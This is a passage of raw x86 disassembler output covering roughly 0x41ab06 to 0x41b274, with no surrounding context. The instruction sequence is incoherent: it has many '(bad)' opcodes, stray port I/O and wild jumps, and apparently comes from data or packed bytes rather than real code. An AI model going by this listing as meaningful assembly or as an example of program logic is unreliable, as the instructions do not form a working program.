  41ab06:	xor    eax,0x1b355a96
  41ab0b:	out    0x70,al
  41ab0d:	xchg   edx,eax
  41ab0e:	xchg   BYTE PTR [eax],ch
  41ab10:	data16 loope 0x41ab55
  41ab13:	daa    
  41ab14:	xchg   esp,eax
  41ab15:	and    eax,0x26139d1b
  41ab1a:	test   bh,ch
  41ab1c:	jbe    0x41ab75
  41ab1e:	mov    esp,0x10cb848a
  41ab23:	dec    eax
  41ab24:	cdq    
  41ab25:	or     ebp,DWORD PTR [ecx-0x5]
  41ab28:	hlt    
  41ab29:	mov    esi,0x7f117b14
  41ab2e:	ins    BYTE PTR es:[edi],dx
  41ab2f:	inc    esp
  41ab30:	retf   0xf628
  41ab33:	add    edx,DWORD PTR [edx-0x8]
  41ab36:	pop    ebp
  41ab37:	fnstcw WORD PTR [edx-0x7c00be8b]
  41ab3d:	bnd jns 0x41aae5
  41ab40:	xor    BYTE PTR [ebp-0x41],ah
  41ab43:	add    eax,0x785ccce6
  41ab48:	popa   
  41ab49:	adc    ch,BYTE PTR [ecx+0x7d]
  41ab4c:	shr    BYTE PTR [ebx],0xa7
  41ab4f:	pop    ebx
  41ab50:	inc    ecx
  41ab51:	int    0x8a
  41ab53:	sahf   
  41ab54:	push   cs
  41ab55:	nop    DWORD PTR [ebx+0x4c]
  41ab59:	mov    esp,0x6a67f017
  41ab5e:	lods   eax,DWORD PTR ds:[esi]
  41ab5f:	mov    eax,0x3cbae09c
  41ab64:	lods   al,BYTE PTR ds:[esi]
  41ab65:	(bad)  
  41ab66:	push   0xffffffda
  41ab68:	mov    eax,0xd6804a34
  41ab6d:	adc    BYTE PTR [edx+eiz*4+0x58bc487e],dh
  41ab74:	stos   DWORD PTR es:[edi],eax
  41ab75:	cmp    dl,0x49
  41ab78:	or     DWORD PTR [esi+ebx*8-0xd],ecx
  41ab7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab7d:	pop    edi
  41ab7e:	bound  esi,QWORD PTR [ebx+0x58]
  41ab81:	mov    DWORD PTR [eax],ecx
  41ab83:	lea    eax,[ebx-0x73]
  41ab86:	xchg   esp,eax
  41ab87:	mov    al,ds:0xa1af3c1c
  41ab8c:	mov    ds:0xb978479,eax
  41ab91:	stc    
  41ab92:	mov    bh,0xb6
  41ab94:	xchg   esp,eax
  41ab95:	call   0xa0bc4a91
  41ab9a:	mov    cl,0xb2
  41ab9c:	cld    
  41ab9d:	sbb    eax,0xf4c4178
  41aba2:	ins    BYTE PTR es:[edi],dx
  41aba3:	(bad)  
  41aba4:	inc    eax
  41aba5:	ret    0xb427
  41aba8:	out    dx,eax
  41aba9:	outs   dx,BYTE PTR ds:[esi]
  41abaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abab:	out    0x8,eax
  41abad:	sbb    ebx,ebp
  41abaf:	jns    0x41abc5
  41abb1:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abb3:	mov    al,0xd7
  41abb5:	jmp    0x41ac31
  41abb7:	dec    ebp
  41abb8:	jns    0x41abd9
  41abba:	mov    al,BYTE PTR [edx-0x4e2227b]
  41abc0:	jge    0x41ab5e
  41abc2:	inc    ecx
  41abc3:	cdq    
  41abc4:	push   es
  41abc5:	cs adc ch,0x11
  41abc9:	xor    cl,BYTE PTR [ecx+0x69]
  41abcc:	ins    DWORD PTR es:[edi],dx
  41abcd:	ror    DWORD PTR [edx],0x37
  41abd0:	lahf   
  41abd1:	popf   
  41abd2:	jno    0x41abff
  41abd4:	fnstcw WORD PTR [esi]
  41abd6:	(bad)  
  41abd8:	cmc    
  41abd9:	inc    edi
  41abda:	mov    al,0xad
  41abdc:	sub    ecx,DWORD PTR [edi+ebx*2]
  41abdf:	addr16 and cl,dl
  41abe2:	out    0xfb,al
  41abe4:	scas   al,BYTE PTR es:[edi]
  41abe5:	mov    al,ds:0x87660e84
  41abea:	mov    esp,0x36e81c91
  41abef:	retf   
  41abf0:	sti    
  41abf1:	xchg   edi,eax
  41abf2:	and    ch,BYTE PTR ds:[esi]
  41abf5:	inc    edi
  41abf6:	jno    0x41ac60
  41abf8:	push   cs
  41abf9:	dec    ebx
  41abfa:	data16 jo 0x41abd9
  41abfd:	and    ebx,DWORD PTR [esi+0x4936b6d]
  41ac03:	sub    DWORD PTR [esi-0x6a],0xffffffa6
  41ac07:	out    dx,al
  41ac08:	jnp    0x41abc0
  41ac0a:	cmp    BYTE PTR [ebx],0xf7
  41ac0d:	scas   eax,DWORD PTR es:[edi]
  41ac0e:	push   esi
  41ac0f:	in     eax,dx
  41ac10:	mov    bl,0x66
  41ac12:	rcl    BYTE PTR [edx+0x6722c0e8],1
  41ac18:	mov    edi,0x60ae9ba
  41ac1d:	adc    bh,BYTE PTR [edi+ebp*8]
  41ac20:	je     0x41abd8
  41ac22:	pusha  
  41ac23:	adc    eax,DWORD PTR ds:[edi]
  41ac26:	or     eax,0x30d962fd
  41ac2b:	pop    ss
  41ac2c:	rcr    BYTE PTR [edi+eiz*2],1
  41ac2f:	loop   0x41ac19
  41ac31:	mov    ah,BYTE PTR [eax-0x58]
  41ac34:	inc    ebx
  41ac35:	rcr    ebp,cl
  41ac37:	aam    0x5c
  41ac39:	je     0x41ac48
  41ac3b:	push   esi
  41ac3c:	aam    0x83
  41ac3e:	push   es
  41ac3f:	and    eax,0x92d1de5
  41ac44:	xor    BYTE PTR [ebx+0x77],al
  41ac47:	jns    0x41ac01
  41ac49:	mov    cs,WORD PTR [ebx+0x43a15408]
  41ac4f:	cmc    
  41ac50:	inc    ebp
  41ac51:	sub    dl,BYTE PTR [ecx+eax*4+0x2f16b4a]
  41ac58:	pusha  
  41ac59:	add    eax,0x7e7738aa
  41ac5e:	in     al,dx
  41ac5f:	adc    DWORD PTR [ebp-0x3],ecx
  41ac62:	cdq    
  41ac63:	iret   
  41ac64:	leave  
  41ac65:	test   BYTE PTR [ebp+0x55378310],bh
  41ac6b:	inc    edx
  41ac6c:	imul   edx,DWORD PTR [eax],0x32ce26f5
  41ac72:	mov    ecx,0xc9c21a0c
  41ac77:	cmp    eax,DWORD PTR [eax-0x1459473c]
  41ac7d:	and    dl,BYTE PTR [eax]
  41ac7f:	ins    BYTE PTR es:[edi],dx
  41ac80:	push   eax
  41ac81:	and    BYTE PTR [ecx-0x11],ch
  41ac84:	push   es
  41ac85:	hlt    
  41ac86:	or     al,0xbb
  41ac88:	pop    esi
  41ac89:	and    eax,0x1a7abf8e
  41ac8e:	sub    al,0x37
  41ac90:	sbb    ebp,DWORD PTR [edi]
  41ac92:	es pop esp
  41ac94:	cmp    dh,cl
  41ac96:	daa    
  41ac97:	cli    
  41ac98:	mov    ebp,0x9671da3
  41ac9d:	fsubr  DWORD PTR [edx]
  41ac9f:	out    0x92,eax
  41aca1:	(bad)  
  41aca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aca3:	adc    BYTE PTR [edx-0x630b0b08],dl
  41aca9:	jns    0x41ac44
  41acab:	xchg   ecx,eax
  41acac:	jecxz  0x41ad1d
  41acae:	sbb    cl,ah
  41acb0:	inc    esp
  41acb1:	sti    
  41acb2:	data16 int3 
  41acb4:	leave  
  41acb5:	fmul   DWORD PTR [edi-0x1eb1ad0e]
  41acbb:	mov    al,ds:0x69e95f8d
  41acc0:	jmp    0xa69fd0bb
  41acc5:	sbb    ah,BYTE PTR [ebx+0x54]
  41acc8:	sub    ebx,esp
  41acca:	imul   BYTE PTR [ebx+0x3a72b50a]
  41acd0:	push   edi
  41acd1:	retf   
  41acd2:	fisub  WORD PTR [ecx-0x4a]
  41acd5:	add    eax,0x4477ab41
  41acda:	mov    al,ds:0x70f23a36
  41acdf:	adc    al,0xc6
  41ace1:	inc    ebx
  41ace2:	push   es
  41ace3:	mov    cl,0x13
  41ace5:	add    DWORD PTR [edi+0x3169c03],edi
  41aceb:	cs es dec ebx
  41acee:	ror    DWORD PTR [ecx+0x31c0d231],1
  41acf4:	pop    ebx
  41acf5:	je     0x41ad19
  41acf7:	adc    BYTE PTR [edi],bl
  41acf9:	adc    BYTE PTR [ebx-0x3072b4d9],ch
  41acff:	je     0x41ac83
  41ad01:	xor    eax,0x63e658bc
  41ad06:	out    dx,al
  41ad07:	mov    ds,ecx
  41ad09:	nop
  41ad0a:	mov    edi,0x99c0ded7
  41ad0f:	jne    0x41ad28
  41ad11:	inc    edi
  41ad12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad13:	cdq    
  41ad14:	or     bl,dh
  41ad16:	rcr    BYTE PTR [ecx+eax*4+0x3],cl
  41ad1a:	inc    esp
  41ad1b:	sub    al,0x7c
  41ad1d:	in     eax,dx
  41ad1e:	mov    ds:0x57000532,al
  41ad23:	or     edi,esi
  41ad25:	mov    WORD PTR [edi+0x2aac91ed],?
  41ad2b:	out    dx,eax
  41ad2c:	or     dl,bh
  41ad2e:	dec    ecx
  41ad2f:	adc    eax,DWORD PTR [esi-0x62]
  41ad32:	dec    ebx
  41ad33:	pop    esp
  41ad34:	daa    
  41ad35:	lods   al,BYTE PTR ds:[esi]
  41ad36:	cli    
  41ad37:	xor    BYTE PTR [edi+0x58],al
  41ad3a:	jl     0x41ad84
  41ad3c:	or     eax,0xe6558c6c
  41ad41:	sub    bl,BYTE PTR [ebx]
  41ad43:	sub    bl,dh
  41ad45:	lods   al,BYTE PTR ds:[esi]
  41ad46:	xor    eax,0xec078d61
  41ad4b:	jecxz  0x41ad0b
  41ad4d:	jmp    FWORD PTR [ecx+0x12]
  41ad50:	lods   eax,DWORD PTR ds:[esi]
  41ad51:	pop    ecx
  41ad52:	xchg   edi,eax
  41ad53:	ds inc eax
  41ad55:	inc    ecx
  41ad56:	pusha  
  41ad57:	xor    al,0x93
  41ad59:	ror    DWORD PTR [esi-0x2f],1
  41ad5c:	adc    eax,0x926c9254
  41ad61:	mov    dh,0x23
  41ad63:	push   edi
  41ad64:	and    ebx,DWORD PTR [eax+0x69c35ae4]
  41ad6a:	popa   
  41ad6b:	sbb    edi,DWORD PTR [esi-0x1c6c1f0f]
  41ad71:	(bad)  
  41ad73:	inc    esp
  41ad74:	stc    
  41ad75:	mov    BYTE PTR [edi],ah
  41ad77:	xor    ecx,DWORD PTR [ebp-0x4e]
  41ad7a:	out    dx,eax
  41ad7b:	lahf   
  41ad7c:	push   esp
  41ad7d:	adc    al,0x4c
  41ad7f:	test   al,0xd8
  41ad81:	inc    edi
  41ad82:	add    al,bh
  41ad84:	add    al,0x40
  41ad86:	adc    eax,0x2c21da71
  41ad8b:	aas    
  41ad8c:	neg    BYTE PTR [ecx+0x5]
  41ad8f:	xchg   ecx,eax
  41ad90:	inc    ecx
  41ad91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad92:	int3   
  41ad93:	pop    edx
  41ad94:	ins    BYTE PTR es:[edi],dx
  41ad95:	fdiv   DWORD PTR [edx+0x23]
  41ad98:	mov    ecx,0x5869aad5
  41ad9d:	pop    ebx
  41ad9e:	daa    
  41ad9f:	mov    esi,0xbb841e6e
  41ada4:	(bad)  
  41ada7:	sbb    eax,0x6c51af98
  41adac:	popa   
  41adad:	test   edi,0x70fa38e0
  41adb3:	xchg   BYTE PTR [ebx+0x37],dl
  41adb6:	push   edi
  41adb7:	icebp  
  41adb8:	arpl   WORD PTR [edi+0x26a15f40],sp
  41adbe:	jne    0x41adbc
  41adc0:	sti    
  41adc1:	sbb    DWORD PTR [eax-0x26c84ab5],esp
  41adc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adc8:	mov    edx,0xf22968c
  41adcd:	dec    ebp
  41adce:	daa    
  41adcf:	mov    DWORD PTR ds:0x7f0b93f0,esp
  41add5:	cmp    ebx,ebx
  41add7:	scas   al,BYTE PTR es:[edi]
  41add8:	adc    dl,bh
  41adda:	call   0x77f8:0x530f6b68
  41ade1:	mov    WORD PTR [esi+ebp*8+0x42],ds
  41ade5:	mov    bh,BYTE PTR [edx+0x7b]
  41ade8:	sbb    DWORD PTR [edx-0x44],0xcb090549
  41adef:	cmovns edi,DWORD PTR [ebx+0x70]
  41adf3:	stc    
  41adf4:	jmp    0xa2ead882
  41adf9:	jge    0x41ad93
  41adfb:	pop    ecx
  41adfc:	inc    eax
  41adfd:	lds    esp,FWORD PTR [ecx+ebp*1-0x23d5b493]
  41ae04:	lahf   
  41ae05:	jge    0x41ae10
  41ae07:	loop   0x41ae06
  41ae09:	dec    ecx
  41ae0a:	and    eax,edx
  41ae0c:	jo     0x41ae8b
  41ae0e:	add    al,0xff
  41ae10:	fsub   st,st(2)
  41ae12:	mov    al,0x30
  41ae14:	sbb    al,ch
  41ae16:	enter  0x2066,0x1d
  41ae1a:	cmp    DWORD PTR ds:0x73915ec2,edx
  41ae20:	pushf  
  41ae21:	fdivr  DWORD PTR [ecx-0x73cb6245]
  41ae27:	popa   
  41ae28:	mov    eax,ds:0x102d3ef0
  41ae2d:	rcr    DWORD PTR [edx+0x3bef6d8e],1
  41ae33:	daa    
  41ae34:	mov    bl,0x79
  41ae36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae37:	bound  edi,QWORD PTR [edi+0x57]
  41ae3a:	sub    BYTE PTR [eax],ch
  41ae3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae3d:	or     eax,0xc5127596
  41ae42:	push   ecx
  41ae43:	imul   ebx,DWORD PTR [esi],0xa744a4ff
  41ae49:	xchg   ebp,eax
  41ae4a:	dec    esp
  41ae4b:	cmp    al,0xfd
  41ae4d:	jae    0x41ae0f
  41ae4f:	lods   eax,DWORD PTR ds:[esi]
  41ae50:	mov    dh,0xd2
  41ae52:	stos   BYTE PTR es:[edi],al
  41ae53:	lock sbb BYTE PTR [esi-0x3f6ac69d],ah
  41ae5a:	mov    esp,DWORD PTR [esi]
  41ae5c:	xor    al,dh
  41ae5e:	cmp    esp,DWORD PTR [ebp+ecx*2+0x7d]
  41ae62:	add    ebx,ebx
  41ae64:	push   ebx
  41ae65:	sub    al,0xee
  41ae67:	bound  edi,QWORD PTR [ebp+0x4a83ca9b]
  41ae6d:	mov    ds:0x454d948,eax
  41ae72:	in     al,dx
  41ae73:	sub    eax,0x5643f6d
  41ae78:	shl    cl,1
  41ae7a:	sub    bl,BYTE PTR [edx+0x39c93e76]
  41ae80:	jmp    0x41aeb5
  41ae82:	in     al,dx
  41ae83:	test   BYTE PTR [ebx-0xb4718e0],bh
  41ae89:	or     BYTE PTR [esi+0x75],bh
  41ae8c:	hlt    
  41ae8d:	bnd jne 0x41ae45
  41ae90:	mov    al,0x82
  41ae92:	rcl    DWORD PTR [edx+0x5d459ec2],0xf
  41ae99:	lock mov ebp,0x31ee7ea4
  41ae9f:	and    dh,BYTE PTR [esi-0x38]
  41aea2:	inc    BYTE PTR [edi+0x65070dde]
  41aea8:	smsw   eax
  41aeab:	shl    BYTE PTR [edi+esi*2-0x34d5317a],0x64
  41aeb3:	add    eax,0xd7b97267
  41aeb8:	in     al,dx
  41aeb9:	push   ss
  41aeba:	push   es
  41aebb:	pop    esp
  41aebc:	in     al,0x3e
  41aebe:	jmp    0x41ae55
  41aec0:	or     al,0xdd
  41aec2:	fld    st(6)
  41aec4:	cli    
  41aec5:	add    al,0xf2
  41aec7:	mov    ecx,ebp
  41aec9:	ret    0x65e3
  41aecc:	retf   
  41aecd:	hlt    
  41aece:	jmp    0xeb7b8ab2
  41aed3:	push   cs
  41aed4:	mov    ch,0x2f
  41aed6:	xor    esp,ebx
  41aed8:	dec    esp
  41aed9:	dec    esp
  41aeda:	pushf  
  41aedb:	rcl    ebx,0xd5
  41aede:	or     eax,0x2bf56444
  41aee3:	aaa    
  41aee4:	xor    DWORD PTR [esi+0x35],esi
  41aee7:	and    DWORD PTR [edi-0x7b],ebp
  41aeea:	push   cs
  41aeeb:	sub    BYTE PTR [ebx-0x46],0x10
  41aeef:	retf   
  41aef0:	(bad)  
  41aef1:	mov    ebx,ebp
  41aef3:	jmp    0xa710:0x45bef103
  41aefa:	lahf   
  41aefb:	addr16 retf 0xb20e
  41aeff:	sbb    eax,0xcc855b7b
  41af04:	ret    0xfc53
  41af07:	jmp    0x41af53
  41af09:	in     al,0x3b
  41af0b:	push   ecx
  41af0c:	jle    0x41aec7
  41af0e:	repz dec edx
  41af10:	cdq    
  41af11:	sub    ebx,DWORD PTR [ebp-0x3d395d84]
  41af17:	jg     0x41af0d
  41af19:	inc    ecx
  41af1a:	popa   
  41af1b:	(bad)  
  41af1c:	jge    0x41af94
  41af1e:	and    dh,BYTE PTR [esi-0x5f8f0897]
  41af24:	pop    edx
  41af25:	add    cx,si
  41af28:	xor    eax,edi
  41af2a:	dec    ebp
  41af2b:	shl    edi,1
  41af2d:	sub    bl,BYTE PTR [ebx+0x15]
  41af30:	iret   
  41af31:	imul   ebx,DWORD PTR [ecx+0x21],0x9c54da1a
  41af38:	jp     0x41aee5
  41af3a:	add    eax,0x70642df2
  41af3f:	adc    al,0x48
  41af41:	fidiv  DWORD PTR [ecx]
  41af43:	sub    ch,BYTE PTR [edi-0x15]
  41af46:	mov    ebx,DWORD PTR [esi+0x430fd202]
  41af4c:	push   ds
  41af4d:	mov    ecx,0x71c73fe0
  41af52:	pop    ds
  41af53:	int    0x29
  41af55:	outs   dx,DWORD PTR ds:[esi]
  41af56:	sbb    eax,0x16370b6b
  41af5b:	daa    
  41af5c:	stos   BYTE PTR es:[edi],al
  41af5d:	test   al,0xc1
  41af5f:	lock fist WORD PTR [edx]
  41af62:	xor    dh,bh
  41af64:	(bad)  
  41af65:	aaa    
  41af66:	inc    ebx
  41af67:	ficomp DWORD PTR [ecx-0xad34f29]
  41af6d:	scas   eax,DWORD PTR es:[edi]
  41af6e:	les    eax,FWORD PTR [eax+0xf67face]
  41af74:	sub    eax,0xc77c91da
  41af79:	sahf   
  41af7a:	mov    eax,0xb8d0a948
  41af7f:	popf   
  41af80:	in     eax,0x94
  41af82:	(bad)  
  41af84:	sbb    dl,BYTE PTR [edi]
  41af86:	fcmovu st,st(4)
  41af88:	sub    al,0x64
  41af8a:	sbb    eax,DWORD PTR [ebx-0x5b]
  41af8d:	add    al,0xd3
  41af8f:	loop   0x41af4f
  41af91:	xlat   BYTE PTR ds:[ebx]
  41af92:	cmp    BYTE PTR [esi+esi*1-0x35],al
  41af96:	popa   
  41af97:	clc    
  41af98:	xchg   DWORD PTR [edi],ebx
  41af9a:	mov    ebx,DWORD PTR [esi+0x2edee559]
  41afa0:	fld    DWORD PTR [edx-0x2268416c]
  41afa6:	fcomp  QWORD PTR [esp+edi*1-0x1f]
  41afaa:	lock dec bx
  41afad:	xchg   DWORD PTR [ecx],ebp
  41afaf:	inc    esp
  41afb0:	test   DWORD PTR [bx+si+0x23],edi
  41afb4:	stc    
  41afb5:	fcmovu st,st(6)
  41afb7:	fimul  DWORD PTR [edx-0x4e]
  41afba:	pusha  
  41afbb:	inc    ebp
  41afbc:	das    
  41afbd:	idiv   ebp
  41afbf:	dec    esi
  41afc0:	hlt    
  41afc1:	xchg   ebp,eax
  41afc2:	xchg   edi,eax
  41afc3:	ins    DWORD PTR es:[edi],dx
  41afc4:	into   
  41afc5:	dec    edx
  41afc6:	pop    ebx
  41afc7:	push   0x3b
  41afc9:	pop    ecx
  41afca:	jl     0x41b00a
  41afcc:	dec    edx
  41afcd:	(bad)
  41afd0:	pop    esi
  41afd1:	pop    esi
  41afd2:	jg     0x41b016
  41afd4:	sar    DWORD PTR [ebx+0x2774cdb0],1
  41afda:	ins    BYTE PTR es:[edi],dx
  41afdb:	or     al,0xba
  41afdd:	hlt    
  41afde:	pop    eax
  41afdf:	sbb    BYTE PTR [ecx+0x50],bl
  41afe2:	jle    0x41b026
  41afe4:	jge    0x41af96
  41afe6:	(bad)  [edx]
  41afe8:	mov    ch,0x74
  41afea:	jmp    0x3ff33ce8
  41afef:	ja     0x41b03e
  41aff1:	imul   ebp,DWORD PTR [esi+ebp*2+0x4e],0x9db974f8
  41aff9:	inc    eax
  41affa:	inc    esp
  41affb:	mov    dh,0x7f
  41affd:	sbb    eax,0x6884b2c
  41b002:	mov    BYTE PTR ds:0x8441e9da,dl
  41b008:	fistp  DWORD PTR [ebx-0x80]
  41b00b:	aaa    
  41b00c:	mov    eax,0x4e55c7d0
  41b011:	push   ebx
  41b012:	sub    DWORD PTR [edx-0x76],esp
  41b015:	xchg   ebp,eax
  41b016:	mov    bh,0x52
  41b018:	sub    eax,0x2860b382
  41b01d:	into   
  41b01e:	fsub   st(4),st
  41b020:	(bad)  
  41b021:	cmp    BYTE PTR [esi],al
  41b023:	cld    
  41b024:	into   
  41b025:	adc    DWORD PTR [edi-0xea49eed],ebx
  41b02b:	aad    0x5d
  41b02d:	mov    bh,0xce
  41b02f:	jmp    0x2b0fac36
  41b034:	fisub  WORD PTR [ecx+eax*1-0x7d]
  41b038:	sub    DWORD PTR [esi],esp
  41b03a:	and    DWORD PTR [edi],ebx
  41b03c:	sub    al,0x77
  41b03e:	mov    al,BYTE PTR [ebx+eiz*2-0x40]
  41b042:	in     al,0x62
  41b044:	mov    ebx,DWORD PTR [ecx-0x302e64a]
  41b04a:	mov    bl,0xa5
  41b04c:	jo     0x41b042
  41b04e:	xor    eax,0xe20bfccc
  41b053:	adc    DWORD PTR [ebx],esi
  41b055:	push   cs
  41b056:	mov    dl,0x5e
  41b058:	push   esp
  41b059:	push   ebp
  41b05a:	test   BYTE PTR [edx+0x50279b3d],bh
  41b060:	out    dx,eax
  41b061:	pop    ss
  41b062:	ret    
  41b063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b064:	arpl   WORD PTR [edi],ax
  41b066:	adc    esi,0x5b
  41b069:	lds    esi,FWORD PTR [esi-0x5c625316]
  41b06f:	or     DWORD PTR [ecx],ebp
  41b071:	xchg   ebx,eax
  41b072:	and    BYTE PTR [ebx-0x2e],ah
  41b075:	and    esi,DWORD PTR [esp+ecx*4+0x71]
  41b079:	sbb    cl,BYTE PTR [esi+0x8deb2d9]
  41b07f:	xlat   BYTE PTR ds:[ebx]
  41b080:	sub    ebp,ebp
  41b082:	out    0x10,al
  41b084:	stc    
  41b085:	inc    esi
  41b086:	imul   edi,DWORD PTR cs:[edx+0x41],0xc92cc56c
  41b08e:	retf   0xb588
  41b091:	cmp    eax,0x19c37596
  41b096:	pop    ecx
  41b097:	mov    WORD PTR [edi-0x46d7a156],ss
  41b09d:	enter  0xf1b3,0xfd
  41b0a1:	bound  ebp,QWORD PTR [ecx+0x543cac7f]
  41b0a7:	ss in  al,0xc5
  41b0aa:	push   0x5e280598
  41b0af:	data16 in al,0xd9
  41b0b2:	mov    es,WORD PTR [esi]
  41b0b4:	mov    dh,0xd2
  41b0b6:	ret    0xdccc
  41b0b9:	in     al,0xa6
  41b0bb:	xchg   sp,ax
  41b0bd:	add    eax,0xa33cc916
  41b0c2:	fbstp  TBYTE PTR [eax+0x84cfb43]
  41b0c8:	or     BYTE PTR ds:0x44789c64,ah
  41b0ce:	das    
  41b0cf:	das    
  41b0d0:	cmp    BYTE PTR [edi+0x7f],0x16
  41b0d4:	and    ah,BYTE PTR [edx+0x1217d048]
  41b0da:	push   ebp
  41b0db:	xchg   ecx,eax
  41b0dc:	mov    eax,0x588e87f1
  41b0e1:	cmp    DWORD PTR [esi+0x4e25da8a],ecx
  41b0e7:	(bad)  [esi-0x51ca1539]
  41b0ed:	stos   DWORD PTR es:[edi],eax
  41b0ee:	lahf   
  41b0ef:	rcr    BYTE PTR [esi+0x24e281ee],cl
  41b0f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0f6:	in     al,0x7b
  41b0f8:	out    0xde,ax
  41b0fb:	pop    ds
  41b0fc:	add    esi,ebx
  41b0fe:	jae    0x41b168
  41b100:	inc    esi
  41b101:	imul   edi,DWORD PTR [edx+0x7a],0xffffffe5
  41b105:	mov    ebp,0x77c98350
  41b10a:	add    WORD PTR [ebp+0x4f],si
  41b10e:	jle    0x41b0e9
  41b110:	or     eax,0x7b79689b
  41b115:	push   ss
  41b116:	add    edx,DWORD PTR [edx-0x27]
  41b119:	cmp    al,0xa7
  41b11b:	cmp    BYTE PTR [edx],cl
  41b11d:	push   ecx
  41b11e:	add    DWORD PTR [esp+ecx*8],ecx
  41b121:	ins    DWORD PTR es:[edi],dx
  41b122:	mov    ds,eax
  41b124:	inc    ebp
  41b125:	loop   0x41b0ef
  41b127:	mov    dl,0xfc
  41b129:	nop
  41b12a:	mov    dh,BYTE PTR [ecx]
  41b12c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b12d:	jmp    0x41b0fa
  41b12f:	pop    es
  41b130:	or     al,0x6d
  41b132:	fdiv   QWORD PTR [ebx]
  41b134:	or     al,0xa4
  41b136:	add    cl,dh
  41b138:	cmp    DWORD PTR [eax+0x28],esp
  41b13b:	sahf   
  41b13c:	pop    ds
  41b13d:	out    dx,al
  41b13e:	out    dx,al
  41b13f:	ja     0x41b1a2
  41b141:	aas    
  41b142:	bound  esi,QWORD PTR [edi-0x8]
  41b145:	repz loopne 0x41b1b5
  41b148:	jb     0x41b0eb
  41b14a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b14b:	mov    eax,ds:0xf09d45d6
  41b150:	jecxz  0x41b121
  41b152:	scas   al,BYTE PTR es:[edi]
  41b153:	inc    edi
  41b154:	out    0xae,eax
  41b156:	loope  0x41b0ea
  41b158:	jno    0x41b177
  41b15a:	fnstsw WORD PTR [ebp-0x4679dce]
  41b160:	fisttp QWORD PTR [esi]
  41b162:	jnp    0x41b1c2
  41b164:	mov    eax,0x2c79fef2
  41b169:	fwait
  41b16a:	test   DWORD PTR [edi+ebp*1],ecx
  41b16d:	leave  
  41b16e:	cmp    eax,0x12076714
  41b173:	push   ebx
  41b174:	sti    
  41b175:	sbb    al,0xd7
  41b177:	ds aam 0xe7
  41b17a:	lahf   
  41b17b:	sub    ecx,DWORD PTR [eax+0xfa9254b]
  41b181:	stc    
  41b182:	cdq    
  41b183:	inc    esp
  41b184:	jo     0x41b119
  41b186:	scas   eax,DWORD PTR es:[edi]
  41b187:	adc    BYTE PTR [ebx+0xe5cb6a1],al
  41b18d:	xchg   esi,eax
  41b18e:	xor    eax,0x1972fbaf
  41b193:	mov    DWORD PTR [edi+0x12],ebx
  41b196:	dec    edi
  41b197:	dec    eax
  41b198:	mov    ebx,0x8573aa0b
  41b19d:	(bad)  
  41b19e:	push   ds
  41b19f:	cld    
  41b1a0:	sbb    DWORD PTR [eax],edx
  41b1a2:	and    BYTE PTR [ecx-0x77382d6b],dl
  41b1a8:	push   ebx
  41b1a9:	sbb    BYTE PTR [ebx-0x348406cd],cl
  41b1af:	pop    DWORD PTR [ebp+0x73987711]
  41b1b5:	ret    
  41b1b6:	int3   
  41b1b7:	add    bh,ah
  41b1b9:	dec    edx
  41b1ba:	sub    BYTE PTR [eax],0xde
  41b1bd:	clc    
  41b1be:	dec    ebx
  41b1bf:	in     eax,0x4c
  41b1c1:	sub    eax,0xa024517a
  41b1c6:	in     al,0x1a
  41b1c8:	shr    BYTE PTR [ebp+0x5a],cl
  41b1cb:	sbb    al,0xe2
  41b1cd:	(bad)  
  41b1ce:	fcom   DWORD PTR [eax-0x6d80a5cb]
  41b1d4:	sahf   
  41b1d5:	mov    es,WORD PTR [edx-0x35]
  41b1d8:	je     0x41b198
  41b1da:	xor    al,0xef
  41b1dc:	mov    DWORD PTR [ebx-0x74],ecx
  41b1df:	(bad)
  41b1e5:	out    dx,eax
  41b1e6:	mov    ebx,0x68a952e1
  41b1eb:	mov    ?,ecx
  41b1ed:	test   ecx,0xe69f18de
  41b1f3:	int    0x34
  41b1f5:	out    0x46,al
  41b1f7:	dec    DWORD PTR [edi-0x64ce0c58]
  41b1fd:	(bad)  
  41b1fe:	xchg   edx,eax
  41b1ff:	ds xchg cx,ax
  41b202:	pop    es
  41b203:	add    al,0x82
  41b205:	test   al,0x5d
  41b207:	pop    ebx
  41b208:	mov    ch,0xf7
  41b20a:	call   0x32c1:0xabc43c44
  41b211:	ins    DWORD PTR es:[edi],dx
  41b212:	loope  0x41b233
  41b214:	add    eax,0xa16d93e2
  41b219:	inc    edx
  41b21a:	repnz hlt 
  41b21c:	jns    0x41b261
  41b21e:	add    DWORD PTR [edi-0x18a3b02],esp
  41b224:	ret    
  41b225:	mov    edi,0xee24c113
  41b22a:	sub    al,0xba
  41b22c:	lods   eax,DWORD PTR ds:[esi]
  41b22d:	popa   
  41b22e:	jg     0x41b25d
  41b230:	out    0x14,al
  41b232:	(bad)  
  41b233:	or     al,0xe8
  41b235:	xlat   BYTE PTR ds:[ebx]
  41b236:	inc    edx
  41b237:	lods   al,BYTE PTR ds:[esi]
  41b238:	push   edx
  41b239:	addr16 or eax,0xa6e4984d
  41b23f:	inc    esp
  41b240:	sahf   
  41b241:	aaa    
  41b242:	cld    
  41b243:	add    BYTE PTR [ecx],0x10
  41b246:	push   esi
  41b247:	pusha  
  41b248:	lock inc eax
  41b24a:	cwde   
  41b24b:	xchg   esi,eax
  41b24c:	pop    edi
  41b24d:	pusha  
  41b24e:	push   eax
  41b24f:	xchg   BYTE PTR [esi-0x1],ah
  41b252:	cld    
  41b253:	fmul   QWORD PTR [ecx-0x5a96d55]
  41b259:	ficom  DWORD PTR [edi]
  41b25b:	xchg   BYTE PTR [edx],ah
  41b25d:	ins    BYTE PTR es:[edi],dx
  41b25e:	sbb    ah,BYTE PTR [edi-0x67685331]
  41b264:	add    BYTE PTR ds:0x3315ec8a,bh
  41b26a:	add    eax,0x52040bc1
  41b26f:	shl    DWORD PTR [eax+eax*4],cl
  41b272:	test   al,0xbd
  41b274:	add    al,0x6a
